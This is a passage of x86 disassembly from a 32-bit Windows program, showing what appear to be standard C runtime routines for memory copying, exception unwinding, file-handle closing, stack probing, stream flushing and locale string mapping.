  40838d:	inc    esp
  40838e:	mov    ds,WORD PTR [eax]
  408390:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  408394:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  408398:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  40839c:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4083a0:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4083a4:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4083a8:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4083ac:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4083b0:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4083b4:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4083b8:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4083bc:	lea    eax,[ecx*4+0x0]
  4083c3:	add    esi,eax
  4083c5:	add    edi,eax
  4083c7:	jmp    DWORD PTR [edx*4+0x4083d0]
  4083ce:	mov    edi,edi
  4083d0:	loopne 0x408355
  4083d2:	inc    eax
  4083d3:	add    al,ch
  4083d5:	add    DWORD PTR [eax+0x0],0xfffffff8
  4083d9:	add    DWORD PTR [eax+0x0],0xc
  4083dd:	test   BYTE PTR [eax+0x0],al
  4083e0:	mov    eax,DWORD PTR [ebp+0x8]
  4083e3:	pop    esi
  4083e4:	pop    edi
  4083e5:	leave  
  4083e6:	ret    
  4083e7:	nop
  4083e8:	mov    al,BYTE PTR [esi+0x3]
  4083eb:	mov    BYTE PTR [edi+0x3],al
  4083ee:	mov    eax,DWORD PTR [ebp+0x8]
  4083f1:	pop    esi
  4083f2:	pop    edi
  4083f3:	leave  
  4083f4:	ret    
  4083f5:	lea    ecx,[ecx+0x0]
  4083f8:	mov    al,BYTE PTR [esi+0x3]
  4083fb:	mov    BYTE PTR [edi+0x3],al
  4083fe:	mov    al,BYTE PTR [esi+0x2]
  408401:	mov    BYTE PTR [edi+0x2],al
  408404:	mov    eax,DWORD PTR [ebp+0x8]
  408407:	pop    esi
  408408:	pop    edi
  408409:	leave  
  40840a:	ret    
  40840b:	nop
  40840c:	mov    al,BYTE PTR [esi+0x3]
  40840f:	mov    BYTE PTR [edi+0x3],al
  408412:	mov    al,BYTE PTR [esi+0x2]
  408415:	mov    BYTE PTR [edi+0x2],al
  408418:	mov    al,BYTE PTR [esi+0x1]
  40841b:	mov    BYTE PTR [edi+0x1],al
  40841e:	mov    eax,DWORD PTR [ebp+0x8]
  408421:	pop    esi
  408422:	pop    edi
  408423:	leave  
  408424:	ret    
  408425:	int3   
  408426:	int3   
  408427:	int3   
  408428:	push   ebx
  408429:	push   esi
  40842a:	push   edi
  40842b:	mov    edx,DWORD PTR [esp+0x10]
  40842f:	mov    eax,DWORD PTR [esp+0x14]
  408433:	mov    ecx,DWORD PTR [esp+0x18]
  408437:	push   ebp
  408438:	push   edx
  408439:	push   eax
  40843a:	push   ecx
  40843b:	push   ecx
  40843c:	push   0x4084b8
  408441:	push   DWORD PTR fs:0x0
  408448:	mov    eax,ds:0x40e004
  40844d:	xor    eax,esp
  40844f:	mov    DWORD PTR [esp+0x8],eax
  408453:	mov    DWORD PTR fs:0x0,esp
  40845a:	mov    eax,DWORD PTR [esp+0x30]
  40845e:	mov    ebx,DWORD PTR [eax+0x8]
  408461:	mov    ecx,DWORD PTR [esp+0x2c]
  408465:	xor    ebx,DWORD PTR [ecx]
  408467:	mov    esi,DWORD PTR [eax+0xc]
  40846a:	cmp    esi,0xfffffffe
  40846d:	je     0x4084aa
  40846f:	mov    edx,DWORD PTR [esp+0x34]
  408473:	cmp    edx,0xfffffffe
  408476:	je     0x40847c
  408478:	cmp    esi,edx
  40847a:	jbe    0x4084aa
  40847c:	lea    esi,[esi+esi*2]
  40847f:	lea    ebx,[ebx+esi*4+0x10]
  408483:	mov    ecx,DWORD PTR [ebx]
  408485:	mov    DWORD PTR [eax+0xc],ecx
  408488:	cmp    DWORD PTR [ebx+0x4],0x0
  40848c:	jne    0x40845a
  40848e:	push   0x101
  408493:	mov    eax,DWORD PTR [ebx+0x8]
  408496:	call   0x40a08d
  40849b:	mov    ecx,0x1
  4084a0:	mov    eax,DWORD PTR [ebx+0x8]
  4084a3:	call   0x40a0ac
  4084a8:	jmp    0x40845a
  4084aa:	pop    DWORD PTR fs:0x0
  4084b1:	add    esp,0x18
  4084b4:	pop    edi
  4084b5:	pop    esi
  4084b6:	pop    ebx
  4084b7:	ret    
  4084b8:	mov    ecx,DWORD PTR [esp+0x4]
  4084bc:	test   DWORD PTR [ecx+0x4],0x6
  4084c3:	mov    eax,0x1
  4084c8:	je     0x4084fd
  4084ca:	mov    eax,DWORD PTR [esp+0x8]
  4084ce:	mov    ecx,DWORD PTR [eax+0x8]
  4084d1:	xor    ecx,eax
  4084d3:	call   0x401d11
  4084d8:	push   ebp
  4084d9:	mov    ebp,DWORD PTR [eax+0x18]
  4084dc:	push   DWORD PTR [eax+0xc]
  4084df:	push   DWORD PTR [eax+0x10]
  4084e2:	push   DWORD PTR [eax+0x14]
  4084e5:	call   0x408428
  4084ea:	add    esp,0xc
  4084ed:	pop    ebp
  4084ee:	mov    eax,DWORD PTR [esp+0x8]
  4084f2:	mov    edx,DWORD PTR [esp+0x10]
  4084f6:	mov    DWORD PTR [edx],eax
  4084f8:	mov    eax,0x3
  4084fd:	ret    
  4084fe:	push   ebp
  4084ff:	mov    ecx,DWORD PTR [esp+0x8]
  408503:	mov    ebp,DWORD PTR [ecx]
  408505:	push   DWORD PTR [ecx+0x1c]
  408508:	push   DWORD PTR [ecx+0x18]
  40850b:	push   DWORD PTR [ecx+0x28]
  40850e:	call   0x408428
  408513:	add    esp,0xc
  408516:	pop    ebp
  408517:	ret    0x4
  40851a:	push   ebp
  40851b:	push   esi
  40851c:	push   edi
  40851d:	push   ebx
  40851e:	mov    ebp,edx
  408520:	xor    eax,eax
  408522:	xor    ebx,ebx
  408524:	xor    edx,edx
  408526:	xor    esi,esi
  408528:	xor    edi,edi
  40852a:	call   ecx
  40852c:	pop    ebx
  40852d:	pop    edi
  40852e:	pop    esi
  40852f:	pop    ebp
  408530:	ret    
  408531:	mov    ebp,edx
  408533:	mov    esi,ecx
  408535:	mov    eax,ecx
  408537:	push   0x1
  408539:	call   0x40a08d
  40853e:	xor    eax,eax
  408540:	xor    ebx,ebx
  408542:	xor    ecx,ecx
  408544:	xor    edx,edx
  408546:	xor    edi,edi
  408548:	jmp    esi
  40854a:	push   ebp
  40854b:	mov    ebp,esp
  40854d:	push   ebx
  40854e:	push   esi
  40854f:	push   edi
  408550:	push   0x0
  408552:	push   0x0
  408554:	push   0x40855f
  408559:	push   ecx
  40855a:	call   0x40ab3e
  40855f:	pop    edi
  408560:	pop    esi
  408561:	pop    ebx
  408562:	pop    ebp
  408563:	ret    
  408564:	push   ebp
  408565:	mov    ebp,DWORD PTR [esp+0x8]
  408569:	push   edx
  40856a:	push   ecx
  40856b:	push   DWORD PTR [esp+0x14]
  40856f:	call   0x408428
  408574:	add    esp,0xc
  408577:	pop    ebp
  408578:	ret    0x8
  40857b:	mov    edi,edi
  40857d:	push   ebp
  40857e:	mov    ebp,esp
  408580:	mov    ecx,DWORD PTR [ebp+0x8]
  408583:	push   ebx
  408584:	xor    ebx,ebx
  408586:	cmp    ecx,ebx
  408588:	push   esi
  408589:	push   edi
  40858a:	jl     0x4085e7
  40858c:	cmp    ecx,DWORD PTR ds:0x412450
  408592:	jae    0x4085e7
  408594:	mov    eax,ecx
  408596:	sar    eax,0x5
  408599:	mov    esi,ecx
  40859b:	lea    edi,[eax*4+0x412460]
  4085a2:	mov    eax,DWORD PTR [edi]
  4085a4:	and    esi,0x1f
  4085a7:	shl    esi,0x6
  4085aa:	add    eax,esi
  4085ac:	test   BYTE PTR [eax+0x4],0x1
  4085b0:	je     0x4085e7
  4085b2:	cmp    DWORD PTR [eax],0xffffffff
  4085b5:	je     0x4085e7
  4085b7:	cmp    DWORD PTR ds:0x40e000,0x1
  4085be:	jne    0x4085dd
  4085c0:	sub    ecx,ebx
  4085c2:	je     0x4085d4
  4085c4:	dec    ecx
  4085c5:	je     0x4085cf
  4085c7:	dec    ecx
  4085c8:	jne    0x4085dd
  4085ca:	push   ebx
  4085cb:	push   0xfffffff4
  4085cd:	jmp    0x4085d7
  4085cf:	push   ebx
  4085d0:	push   0xfffffff5
  4085d2:	jmp    0x4085d7
  4085d4:	push   ebx
  4085d5:	push   0xfffffff6
  4085d7:	call   DWORD PTR ds:0x40b05c
  4085dd:	mov    eax,DWORD PTR [edi]
  4085df:	or     DWORD PTR [esi+eax*1],0xffffffff
  4085e3:	xor    eax,eax
  4085e5:	jmp    0x4085fc
  4085e7:	call   0x4024b6
  4085ec:	mov    DWORD PTR [eax],0x9
  4085f2:	call   0x4024c9
  4085f7:	mov    DWORD PTR [eax],ebx
  4085f9:	or     eax,0xffffffff
  4085fc:	pop    edi
  4085fd:	pop    esi
  4085fe:	pop    ebx
  4085ff:	pop    ebp
  408600:	ret    
  408601:	mov    edi,edi
  408603:	push   ebp
  408604:	mov    ebp,esp
  408606:	mov    eax,DWORD PTR [ebp+0x8]
  408609:	cmp    eax,0xfffffffe
  40860c:	jne    0x408626
  40860e:	call   0x4024c9
  408613:	and    DWORD PTR [eax],0x0
  408616:	call   0x4024b6
  40861b:	mov    DWORD PTR [eax],0x9
  408621:	or     eax,0xffffffff
  408624:	pop    ebp
  408625:	ret    
  408626:	push   esi
  408627:	xor    esi,esi
  408629:	cmp    eax,esi
  40862b:	jl     0x40864f
  40862d:	cmp    eax,DWORD PTR ds:0x412450
  408633:	jae    0x40864f
  408635:	mov    ecx,eax
  408637:	and    eax,0x1f
  40863a:	sar    ecx,0x5
  40863d:	mov    ecx,DWORD PTR [ecx*4+0x412460]
  408644:	shl    eax,0x6
  408647:	add    eax,ecx
  408649:	test   BYTE PTR [eax+0x4],0x1
  40864d:	jne    0x408673
  40864f:	call   0x4024c9
  408654:	mov    DWORD PTR [eax],esi
  408656:	call   0x4024b6
  40865b:	push   esi
  40865c:	push   esi
  40865d:	push   esi
  40865e:	push   esi
  40865f:	push   esi
  408660:	mov    DWORD PTR [eax],0x9
  408666:	call   0x40244e
  40866b:	add    esp,0x14
  40866e:	or     eax,0xffffffff
  408671:	jmp    0x408675
  408673:	mov    eax,DWORD PTR [eax]
  408675:	pop    esi
  408676:	pop    ebp
  408677:	ret    
  408678:	push   0xc
  40867a:	push   0x40c9b8
  40867f:	call   0x403b74
  408684:	mov    edi,DWORD PTR [ebp+0x8]
  408687:	mov    eax,edi
  408689:	sar    eax,0x5
  40868c:	mov    esi,edi
  40868e:	and    esi,0x1f
  408691:	shl    esi,0x6
  408694:	add    esi,DWORD PTR [eax*4+0x412460]
  40869b:	mov    DWORD PTR [ebp-0x1c],0x1
  4086a2:	xor    ebx,ebx
  4086a4:	cmp    DWORD PTR [esi+0x8],ebx
  4086a7:	jne    0x4086df
  4086a9:	push   0xa
  4086ab:	call   0x4066fe
  4086b0:	pop    ecx
  4086b1:	mov    DWORD PTR [ebp-0x4],ebx
  4086b4:	cmp    DWORD PTR [esi+0x8],ebx
  4086b7:	jne    0x4086d3
  4086b9:	push   0xfa0
  4086be:	lea    eax,[esi+0xc]
  4086c1:	push   eax
  4086c2:	call   0x407c4c
  4086c7:	pop    ecx
  4086c8:	pop    ecx
  4086c9:	test   eax,eax
  4086cb:	jne    0x4086d0
  4086cd:	mov    DWORD PTR [ebp-0x1c],ebx
  4086d0:	inc    DWORD PTR [esi+0x8]
  4086d3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4086da:	call   0x40870f
  4086df:	cmp    DWORD PTR [ebp-0x1c],ebx
  4086e2:	je     0x408701
  4086e4:	mov    eax,edi
  4086e6:	sar    eax,0x5
  4086e9:	and    edi,0x1f
  4086ec:	shl    edi,0x6
  4086ef:	mov    eax,DWORD PTR [eax*4+0x412460]
  4086f6:	lea    eax,[eax+edi*1+0xc]
  4086fa:	push   eax
  4086fb:	call   DWORD PTR ds:0x40b130
  408701:	mov    eax,DWORD PTR [ebp-0x1c]
  408704:	call   0x403bb9
  408709:	ret    
  40870a:	xor    ebx,ebx
  40870c:	mov    edi,DWORD PTR [ebp+0x8]
  40870f:	push   0xa
  408711:	call   0x406624
  408716:	pop    ecx
  408717:	ret    
  408718:	mov    edi,edi
  40871a:	push   ebp
  40871b:	mov    ebp,esp
  40871d:	mov    eax,DWORD PTR [ebp+0x8]
  408720:	mov    ecx,eax
  408722:	and    eax,0x1f
  408725:	sar    ecx,0x5
  408728:	mov    ecx,DWORD PTR [ecx*4+0x412460]
  40872f:	shl    eax,0x6
  408732:	lea    eax,[ecx+eax*1+0xc]
  408736:	push   eax
  408737:	call   DWORD PTR ds:0x40b134
  40873d:	pop    ebp
  40873e:	ret    
  40873f:	mov    edi,edi
  408741:	push   ebp
  408742:	mov    ebp,esp
  408744:	sub    esp,0x10
  408747:	mov    eax,ds:0x40e004
  40874c:	xor    eax,ebp
  40874e:	mov    DWORD PTR [ebp-0x4],eax
  408751:	push   esi
  408752:	xor    esi,esi
  408754:	cmp    DWORD PTR ds:0x40ec90,esi
  40875a:	je     0x4087ab
  40875c:	cmp    DWORD PTR ds:0x40edc8,0xfffffffe
  408763:	jne    0x40876a
  408765:	call   0x40a0af
  40876a:	mov    eax,ds:0x40edc8
  40876f:	cmp    eax,0xffffffff
  408772:	jne    0x40877b
  408774:	mov    eax,0xffff
  408779:	jmp    0x4087eb
  40877b:	push   esi
  40877c:	lea    ecx,[ebp-0x10]
  40877f:	push   ecx
  408780:	push   0x1
  408782:	lea    ecx,[ebp+0x8]
  408785:	push   ecx
  408786:	push   eax
  408787:	call   DWORD PTR ds:0x40b050
  40878d:	test   eax,eax
  40878f:	jne    0x4087f8
  408791:	cmp    DWORD PTR ds:0x40ec90,0x2
  408798:	jne    0x408774
  40879a:	call   DWORD PTR ds:0x40b08c
  4087a0:	cmp    eax,0x78
  4087a3:	jne    0x408774
  4087a5:	mov    DWORD PTR ds:0x40ec90,esi
  4087ab:	push   esi
  4087ac:	push   esi
  4087ad:	push   0x5
  4087af:	lea    eax,[ebp-0xc]
  4087b2:	push   eax
  4087b3:	push   0x1
  4087b5:	lea    eax,[ebp+0x8]
  4087b8:	push   eax
  4087b9:	push   esi
  4087ba:	call   DWORD PTR ds:0x40b054
  4087c0:	push   eax
  4087c1:	call   DWORD PTR ds:0x40b124
  4087c7:	mov    ecx,DWORD PTR ds:0x40edc8
  4087cd:	cmp    ecx,0xffffffff
  4087d0:	je     0x408774
  4087d2:	push   esi
  4087d3:	lea    edx,[ebp-0x10]
  4087d6:	push   edx
  4087d7:	push   eax
  4087d8:	lea    eax,[ebp-0xc]
  4087db:	push   eax
  4087dc:	push   ecx
  4087dd:	call   DWORD PTR ds:0x40b058
  4087e3:	test   eax,eax
  4087e5:	je     0x408774
  4087e7:	mov    ax,WORD PTR [ebp+0x8]
  4087eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ee:	xor    ecx,ebp
  4087f0:	pop    esi
  4087f1:	call   0x401d11
  4087f6:	leave  
  4087f7:	ret    
  4087f8:	mov    DWORD PTR ds:0x40ec90,0x1
  408802:	jmp    0x4087e7
  408804:	int3   
  408805:	int3   
  408806:	int3   
  408807:	int3   
  408808:	int3   
  408809:	int3   
  40880a:	int3   
  40880b:	int3   
  40880c:	int3   
  40880d:	int3   
  40880e:	int3   
  40880f:	int3   
  408810:	push   ecx
  408811:	lea    ecx,[esp+0x4]
  408815:	sub    ecx,eax
  408817:	sbb    eax,eax
  408819:	not    eax
  40881b:	and    ecx,eax
  40881d:	mov    eax,esp
  40881f:	and    eax,0xfffff000
  408824:	cmp    ecx,eax
  408826:	jb     0x408832
  408828:	mov    eax,ecx
  40882a:	pop    ecx
  40882b:	xchg   esp,eax
  40882c:	mov    eax,DWORD PTR [eax]
  40882e:	mov    DWORD PTR [esp],eax
  408831:	ret    
  408832:	sub    eax,0x1000
  408837:	test   DWORD PTR [eax],eax
  408839:	jmp    0x408824
  40883b:	push   0x10
  40883d:	push   0x40c9d8
  408842:	call   0x403b74
  408847:	xor    ebx,ebx
  408849:	mov    DWORD PTR [ebp-0x1c],ebx
  40884c:	push   0x1
  40884e:	call   0x4066fe
  408853:	pop    ecx
  408854:	mov    DWORD PTR [ebp-0x4],ebx
  408857:	push   0x3
  408859:	pop    edi
  40885a:	mov    DWORD PTR [ebp-0x20],edi
  40885d:	cmp    edi,DWORD PTR ds:0x412440
  408863:	jge    0x4088bc
  408865:	mov    esi,edi
  408867:	shl    esi,0x2
  40886a:	mov    eax,ds:0x411424
  40886f:	add    eax,esi
  408871:	cmp    DWORD PTR [eax],ebx
  408873:	je     0x4088b9
  408875:	mov    eax,DWORD PTR [eax]
  408877:	test   BYTE PTR [eax+0xc],0x83
  40887b:	je     0x40888c
  40887d:	push   eax
  40887e:	call   0x40a172
  408883:	pop    ecx
  408884:	cmp    eax,0xffffffff
  408887:	je     0x40888c
  408889:	inc    DWORD PTR [ebp-0x1c]
  40888c:	cmp    edi,0x14
  40888f:	jl     0x4088b9
  408891:	mov    eax,ds:0x411424
  408896:	mov    eax,DWORD PTR [esi+eax*1]
  408899:	add    eax,0x20
  40889c:	push   eax
  40889d:	call   DWORD PTR ds:0x40b0e4
  4088a3:	mov    eax,ds:0x411424
  4088a8:	push   DWORD PTR [esi+eax*1]
  4088ab:	call   0x402682
  4088b0:	pop    ecx
  4088b1:	mov    eax,ds:0x411424
  4088b6:	mov    DWORD PTR [esi+eax*1],ebx
  4088b9:	inc    edi
  4088ba:	jmp    0x40885a
  4088bc:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4088c3:	call   0x4088d1
  4088c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4088cb:	call   0x403bb9
  4088d0:	ret    
  4088d1:	push   0x1
  4088d3:	call   0x406624
  4088d8:	pop    ecx
  4088d9:	ret    
  4088da:	mov    edi,edi
  4088dc:	push   ebp
  4088dd:	mov    ebp,esp
  4088df:	push   ebx
  4088e0:	push   esi
  4088e1:	mov    esi,DWORD PTR [ebp+0x8]
  4088e4:	mov    eax,DWORD PTR [esi+0xc]
  4088e7:	mov    ecx,eax
  4088e9:	and    cl,0x3
  4088ec:	xor    ebx,ebx
  4088ee:	cmp    cl,0x2
  4088f1:	jne    0x408933
  4088f3:	test   eax,0x108
  4088f8:	je     0x408933
  4088fa:	mov    eax,DWORD PTR [esi+0x8]
  4088fd:	push   edi
  4088fe:	mov    edi,DWORD PTR [esi]
  408900:	sub    edi,eax
  408902:	test   edi,edi
  408904:	jle    0x408932
  408906:	push   edi
  408907:	push   eax
  408908:	push   esi
  408909:	call   0x404a09
  40890e:	pop    ecx
  40890f:	push   eax
  408910:	call   0x4046cb
  408915:	add    esp,0xc
  408918:	cmp    eax,edi
  40891a:	jne    0x40892b
  40891c:	mov    eax,DWORD PTR [esi+0xc]
  40891f:	test   al,al
  408921:	jns    0x408932
  408923:	and    eax,0xfffffffd
  408926:	mov    DWORD PTR [esi+0xc],eax
  408929:	jmp    0x408932
  40892b:	or     DWORD PTR [esi+0xc],0x20
  40892f:	or     ebx,0xffffffff
  408932:	pop    edi
  408933:	mov    eax,DWORD PTR [esi+0x8]
  408936:	and    DWORD PTR [esi+0x4],0x0
  40893a:	mov    DWORD PTR [esi],eax
  40893c:	pop    esi
  40893d:	mov    eax,ebx
  40893f:	pop    ebx
  408940:	pop    ebp
  408941:	ret    
  408942:	mov    edi,edi
  408944:	push   ebp
  408945:	mov    ebp,esp
  408947:	push   esi
  408948:	mov    esi,DWORD PTR [ebp+0x8]
  40894b:	test   esi,esi
  40894d:	jne    0x408958
  40894f:	push   esi
  408950:	call   0x40898a
  408955:	pop    ecx
  408956:	jmp    0x408987
  408958:	push   esi
  408959:	call   0x4088da
  40895e:	pop    ecx
  40895f:	test   eax,eax
  408961:	je     0x408968
  408963:	or     eax,0xffffffff
  408966:	jmp    0x408987
  408968:	test   DWORD PTR [esi+0xc],0x4000
  40896f:	je     0x408985
  408971:	push   esi
  408972:	call   0x404a09
  408977:	push   eax
  408978:	call   0x40a1ee
  40897d:	pop    ecx
  40897e:	neg    eax
  408980:	pop    ecx
  408981:	sbb    eax,eax
  408983:	jmp    0x408987
  408985:	xor    eax,eax
  408987:	pop    esi
  408988:	pop    ebp
  408989:	ret    
  40898a:	push   0x14
  40898c:	push   0x40c9f8
  408991:	call   0x403b74
  408996:	xor    edi,edi
  408998:	mov    DWORD PTR [ebp-0x1c],edi
  40899b:	mov    DWORD PTR [ebp-0x24],edi
  40899e:	push   0x1
  4089a0:	call   0x4066fe
  4089a5:	pop    ecx
  4089a6:	mov    DWORD PTR [ebp-0x4],edi
  4089a9:	xor    esi,esi
  4089ab:	mov    DWORD PTR [ebp-0x20],esi
  4089ae:	cmp    esi,DWORD PTR ds:0x412440
  4089b4:	jge    0x408a3d
  4089ba:	mov    eax,ds:0x411424
  4089bf:	lea    eax,[eax+esi*4]
  4089c2:	cmp    DWORD PTR [eax],edi
  4089c4:	je     0x408a24
  4089c6:	mov    eax,DWORD PTR [eax]
  4089c8:	test   BYTE PTR [eax+0xc],0x83
  4089cc:	je     0x408a24
  4089ce:	push   eax
  4089cf:	push   esi
  4089d0:	call   0x40496c
  4089d5:	pop    ecx
  4089d6:	pop    ecx
  4089d7:	xor    edx,edx
  4089d9:	inc    edx
  4089da:	mov    DWORD PTR [ebp-0x4],edx
  4089dd:	mov    eax,ds:0x411424
  4089e2:	mov    eax,DWORD PTR [eax+esi*4]
  4089e5:	mov    ecx,DWORD PTR [eax+0xc]
  4089e8:	test   cl,0x83
  4089eb:	je     0x408a1c
  4089ed:	cmp    DWORD PTR [ebp+0x8],edx
  4089f0:	jne    0x408a03
  4089f2:	push   eax
  4089f3:	call   0x408942
  4089f8:	pop    ecx
  4089f9:	cmp    eax,0xffffffff
  4089fc:	je     0x408a1c
  4089fe:	inc    DWORD PTR [ebp-0x1c]
  408a01:	jmp    0x408a1c
  408a03:	cmp    DWORD PTR [ebp+0x8],edi
  408a06:	jne    0x408a1c
  408a08:	test   cl,0x2
  408a0b:	je     0x408a1c
  408a0d:	push   eax
  408a0e:	call   0x408942
  408a13:	pop    ecx
  408a14:	cmp    eax,0xffffffff
  408a17:	jne    0x408a1c
  408a19:	or     DWORD PTR [ebp-0x24],eax
  408a1c:	mov    DWORD PTR [ebp-0x4],edi
  408a1f:	call   0x408a2c
  408a24:	inc    esi
  408a25:	jmp    0x4089ab
  408a27:	xor    edi,edi
  408a29:	mov    esi,DWORD PTR [ebp-0x20]
  408a2c:	mov    eax,ds:0x411424
  408a31:	push   DWORD PTR [eax+esi*4]
  408a34:	push   esi
  408a35:	call   0x4049da
  408a3a:	pop    ecx
  408a3b:	pop    ecx
  408a3c:	ret    
  408a3d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  408a44:	call   0x408a5b
  408a49:	cmp    DWORD PTR [ebp+0x8],0x1
  408a4d:	mov    eax,DWORD PTR [ebp-0x1c]
  408a50:	je     0x408a55
  408a52:	mov    eax,DWORD PTR [ebp-0x24]
  408a55:	call   0x403bb9
  408a5a:	ret    
  408a5b:	push   0x1
  408a5d:	call   0x406624
  408a62:	pop    ecx
  408a63:	ret    
  408a64:	push   0x1
  408a66:	call   0x40898a
  408a6b:	pop    ecx
  408a6c:	ret    
  408a6d:	mov    edi,edi
  408a6f:	push   ebp
  408a70:	mov    ebp,esp
  408a72:	mov    eax,DWORD PTR [ebp+0x8]
  408a75:	test   eax,eax
  408a77:	je     0x408a8b
  408a79:	sub    eax,0x8
  408a7c:	cmp    DWORD PTR [eax],0xdddd
  408a82:	jne    0x408a8b
  408a84:	push   eax
  408a85:	call   0x402682
  408a8a:	pop    ecx
  408a8b:	pop    ebp
  408a8c:	ret    
  408a8d:	mov    edi,edi
  408a8f:	push   ebp
  408a90:	mov    ebp,esp
  408a92:	sub    esp,0x14
  408a95:	mov    eax,ds:0x40e004
  408a9a:	xor    eax,ebp
  408a9c:	mov    DWORD PTR [ebp-0x4],eax
  408a9f:	push   ebx
  408aa0:	push   esi
  408aa1:	xor    ebx,ebx
  408aa3:	push   edi
  408aa4:	mov    esi,ecx
  408aa6:	cmp    DWORD PTR ds:0x40f998,ebx
  408aac:	jne    0x408ae6
  408aae:	push   ebx
  408aaf:	push   ebx
  408ab0:	xor    edi,edi
  408ab2:	inc    edi
  408ab3:	push   edi
  408ab4:	push   0x40babc
  408ab9:	push   0x100
  408abe:	push   ebx
  408abf:	call   DWORD PTR ds:0x40b06c
  408ac5:	test   eax,eax
  408ac7:	je     0x408ad1
  408ac9:	mov    DWORD PTR ds:0x40f998,edi
  408acf:	jmp    0x408ae6
  408ad1:	call   DWORD PTR ds:0x40b08c
  408ad7:	cmp    eax,0x78
  408ada:	jne    0x408ae6
  408adc:	mov    DWORD PTR ds:0x40f998,0x2
  408ae6:	cmp    DWORD PTR [ebp+0x14],ebx
  408ae9:	jle    0x408b0d
  408aeb:	mov    ecx,DWORD PTR [ebp+0x14]
  408aee:	mov    eax,DWORD PTR [ebp+0x10]
  408af1:	dec    ecx
  408af2:	cmp    BYTE PTR [eax],bl
  408af4:	je     0x408afe
  408af6:	inc    eax
  408af7:	cmp    ecx,ebx
  408af9:	jne    0x408af1
  408afb:	or     ecx,0xffffffff
  408afe:	mov    eax,DWORD PTR [ebp+0x14]
  408b01:	sub    eax,ecx
  408b03:	dec    eax
  408b04:	cmp    eax,DWORD PTR [ebp+0x14]
  408b07:	jge    0x408b0a
  408b09:	inc    eax
  408b0a:	mov    DWORD PTR [ebp+0x14],eax
  408b0d:	mov    eax,ds:0x40f998
  408b12:	cmp    eax,0x2
  408b15:	je     0x408cc7
  408b1b:	cmp    eax,ebx
  408b1d:	je     0x408cc7
  408b23:	cmp    eax,0x1
  408b26:	jne    0x408cf8
  408b2c:	mov    DWORD PTR [ebp-0x8],ebx
  408b2f:	cmp    DWORD PTR [ebp+0x20],ebx
  408b32:	jne    0x408b3c
  408b34:	mov    eax,DWORD PTR [esi]
  408b36:	mov    eax,DWORD PTR [eax+0x4]
  408b39:	mov    DWORD PTR [ebp+0x20],eax
  408b3c:	mov    esi,DWORD PTR ds:0x40b148
  408b42:	xor    eax,eax
  408b44:	cmp    DWORD PTR [ebp+0x24],ebx
  408b47:	push   ebx
  408b48:	push   ebx
  408b49:	push   DWORD PTR [ebp+0x14]
  408b4c:	setne  al
  408b4f:	push   DWORD PTR [ebp+0x10]
  408b52:	lea    eax,[eax*8+0x1]
  408b59:	push   eax
  408b5a:	push   DWORD PTR [ebp+0x20]
  408b5d:	call   esi
  408b5f:	mov    edi,eax
  408b61:	cmp    edi,ebx
  408b63:	je     0x408cf8
  408b69:	jle    0x408bae
  408b6b:	push   0xffffffe0
  408b6d:	xor    edx,edx
  408b6f:	pop    eax
  408b70:	div    edi
  408b72:	cmp    eax,0x2
  408b75:	jb     0x408bae
  408b77:	lea    eax,[edi+edi*1+0x8]
  408b7b:	cmp    eax,0x400
  408b80:	ja     0x408b95
  408b82:	call   0x40a4d0
  408b87:	mov    eax,esp
  408b89:	cmp    eax,ebx
  408b8b:	je     0x408ba9
  408b8d:	mov    DWORD PTR [eax],0xcccc
  408b93:	jmp    0x408ba6
  408b95:	push   eax
  408b96:	call   0x407328
  408b9b:	pop    ecx
  408b9c:	cmp    eax,ebx
  408b9e:	je     0x408ba9
  408ba0:	mov    DWORD PTR [eax],0xdddd
  408ba6:	add    eax,0x8
  408ba9:	mov    DWORD PTR [ebp-0xc],eax
  408bac:	jmp    0x408bb1
  408bae:	mov    DWORD PTR [ebp-0xc],ebx
  408bb1:	cmp    DWORD PTR [ebp-0xc],ebx
  408bb4:	je     0x408cf8
  408bba:	push   edi
  408bbb:	push   DWORD PTR [ebp-0xc]
  408bbe:	push   DWORD PTR [ebp+0x14]
  408bc1:	push   DWORD PTR [ebp+0x10]
  408bc4:	push   0x1
  408bc6:	push   DWORD PTR [ebp+0x20]
  408bc9:	call   esi
  408bcb:	test   eax,eax
  408bcd:	je     0x408cb6
  408bd3:	mov    esi,DWORD PTR ds:0x40b06c
  408bd9:	push   ebx
  408bda:	push   ebx
  408bdb:	push   edi
  408bdc:	push   DWORD PTR [ebp-0xc]
  408bdf:	push   DWORD PTR [ebp+0xc]
  408be2:	push   DWORD PTR [ebp+0x8]
  408be5:	call   esi
  408be7:	mov    ecx,eax
  408be9:	mov    DWORD PTR [ebp-0x8],ecx
  408bec:	cmp    ecx,ebx
  408bee:	je     0x408cb6
  408bf4:	test   DWORD PTR [ebp+0xc],0x400
  408bfb:	je     0x408c26
  408bfd:	cmp    DWORD PTR [ebp+0x1c],ebx
  408c00:	je     0x408cb6
  408c06:	cmp    ecx,DWORD PTR [ebp+0x1c]
  408c09:	jg     0x408cb6
  408c0f:	push   DWORD PTR [ebp+0x1c]
  408c12:	push   DWORD PTR [ebp+0x18]
  408c15:	push   edi
  408c16:	push   DWORD PTR [ebp-0xc]
  408c19:	push   DWORD PTR [ebp+0xc]
  408c1c:	push   DWORD PTR [ebp+0x8]
  408c1f:	call   esi
  408c21:	jmp    0x408cb6
  408c26:	cmp    ecx,ebx
  408c28:	jle    0x408c6f
  408c2a:	push   0xffffffe0
  408c2c:	xor    edx,edx
  408c2e:	pop    eax
  408c2f:	div    ecx
  408c31:	cmp    eax,0x2
  408c34:	jb     0x408c6f
  408c36:	lea    eax,[ecx+ecx*1+0x8]
  408c3a:	cmp    eax,0x400
  408c3f:	ja     0x408c57
  408c41:	call   0x40a4d0
  408c46:	mov    esi,esp
  408c48:	cmp    esi,ebx
  408c4a:	je     0x408cb6
  408c4c:	mov    DWORD PTR [esi],0xcccc
